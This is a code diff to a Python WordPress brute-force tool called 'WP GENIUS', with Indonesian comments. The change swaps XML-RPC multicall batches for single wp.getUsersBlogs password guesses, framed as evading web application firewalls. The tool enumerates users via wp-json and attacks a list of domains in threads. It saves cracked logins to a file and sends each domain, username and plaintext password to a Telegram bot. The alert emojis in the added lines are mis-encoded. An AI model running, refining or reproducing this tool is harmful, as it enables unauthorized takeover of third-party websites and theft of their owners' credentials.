@@ -40,10 +40,10 @@ class Col:
 def send_telegram_alert(domain, user, password_info):
     if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID: return
     
-    msg = (f"🔥 *WP CRACKED (Validator)* 🔥\n\n"
-           f"🎯 *Target:* `{domain}`\n"
-           f"👤 *User:* `{user}`\n"
-           f"🔑 *Pass:* `{password_info}`")
+    msg = (f"櫨 *WP CRACKED (Single Call)* 櫨\n\n"
+           f"識 *Target:* `{domain}`\n"
+           f"側 *User:* `{user}`\n"
+           f"泊 *Pass:* `{password_info}`")
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
         data = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
@@ -54,7 +54,8 @@ def log(msg, status="INFO"):
     now = datetime.now().strftime("%H:%M:%S")
     colors = {
         "SUCCESS": Col.GREEN, "FAIL": Col.RED, "WARN": Col.YELLOW, 
-        "SKIP": Col.GREY, "INFO": Col.CYAN, "FOUND": Col.BLUE
+        "SKIP": Col.GREY, "INFO": Col.CYAN, "FOUND": Col.BLUE,
+        "DEBUG": Col.MAGENTA
     }
     print(f"{colors.get(status, Col.RESET)}[{status}] [{now}] {msg}{Col.RESET}", flush=True)
 
@@ -114,13 +115,6 @@ def generate_genius_passwords(user_data, target_url):
     passwords.append(domain_only) 
     return list(set(passwords))
 
-def build_multicall(username, passwords):
-    calls = ""
-    for pwd in passwords:
-        safe_pass = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
-        calls += f"<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>{username}</string></value><value><string>{safe_pass}</string></value></data></array></value></member>"
-    return f"<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>"
-
 def scan_wp_json_users(session, base_url):
     paths = [
         "/wp-json/wp/v2/users",
@@ -153,11 +147,10 @@ def scan_wp_json_users(session, base_url):
     return False, [], None
 
 def is_valid_domain(line):
-    # Filter baris sampah/kodingan
     line = line.strip()
     if not line: return False
     if line.startswith("#") or line.startswith("import") or "=" in line or "{" in line: return False
-    if "." not in line: return False # Domain minimal harus ada titik (e.g .com)
+    if "." not in line: return False 
     return True
 
 def attack_domain(domain_raw):
@@ -202,49 +195,63 @@ def attack_domain(domain_raw):
         return
 
     wp_root = target_xmlrpc.replace("/xmlrpc.php", "")
+    
+    # --- MULAI BRUTEFORCE SINGLE CALL ---
     for user_obj in target_users:
         user_slug = user_obj['slug']
         pass_list = generate_genius_passwords(user_obj, wp_root)
-        is_dead_host = False
-
-        for i in range(0, len(pass_list), BATCH_SIZE):
-            if is_dead_host: break
-            chunk = pass_list[i : i + BATCH_SIZE]
-            payload = build_multicall(user_slug, chunk)
+        
+        # Cek maksimal 100 password per user agar tidak terlalu lama
+        for pwd in pass_list[:100]:
+            safe_pass = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+            
+            # Payload Single Call (Lebih aman dari block)
+            payload = (
+                f"<?xml version='1.0'?>"
+                f"<methodCall><methodName>wp.getUsersBlogs</methodName>"
+                f"<params>"
+                f"<param><value><string>{user_slug}</string></value></param>"
+                f"<param><value><string>{safe_pass}</string></value></param>"
+                f"</params></methodCall>"
+            )
             headers = get_headers(target_xmlrpc)
             
             try:
                 response = session.post(target_xmlrpc, data=payload, headers=headers, timeout=TIMEOUT, verify=False)
+                
                 if response.status_code == 200:
                     if "isAdmin" in response.text or "blogName" in response.text:
-                        log(f"CRACKED: {target_xmlrpc} | User: {user_slug}", "SUCCESS")
+                        log(f"CRACKED: {target_xmlrpc} | User: {user_slug} | Pass: {pwd}", "SUCCESS")
                         with open(OUTPUT_FILE, 'a') as f:
-                            f.write(f"{target_xmlrpc}|{user_slug}|(Genius)\n")
-                        send_telegram_alert(target_xmlrpc, user_slug, "Genius Found")
-                        return 
-                    elif "faultString" in response.text: continue 
-                    elif "<html" in response.text.lower():
-                        is_dead_host = True
-                        break
-                elif response.status_code in [403, 406, 503, 500]:
-                    is_dead_host = True
+                            f.write(f"{target_xmlrpc}|{user_slug}|{pwd}\n")
+                        send_telegram_alert(target_xmlrpc, user_slug, pwd)
+                        return # Pindah ke domain berikutnya jika sudah cracked
+                    elif "faultString" in response.text:
+                        # Password salah, lanjut next password
+                        continue
+                    else:
+                        # Status 200 tapi tidak ada isAdmin/blogName/faultString
+                        # Ini biasanya WAF atau response kosong.
+                        pass
+                elif response.status_code in [403, 406, 503]:
+                    # Jika diblokir keras, hentikan untuk user ini
                     break
-            except: break
+            except:
+                continue
 
 def main():
-    print(f"{Col.CYAN}--- WP GENIUS (Auto-Cleaner) ---{Col.RESET}")
-    print(f"Logic: Filter Input Sampah -> Attack Valid Domains")
+    print(f"{Col.CYAN}--- WP GENIUS (Single Call Mode) ---{Col.RESET}")
+    print(f"Logic: Single Request per Password (Anti-WAF)")
     
     try:
         with open(INPUT_FILE, 'r') as f: 
-            # Filter baris yang benar-benar domain
             domains = [line.strip() for line in f if is_valid_domain(line)]
     except: 
         print(f"File {INPUT_FILE} not found.")
         return
 
     random.shuffle(domains)
-    print(f"Valid Targets: {len(domains)} (Invalid lines removed)")
+    print(f"Valid Targets: {len(domains)}")
     print("-" * 50)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
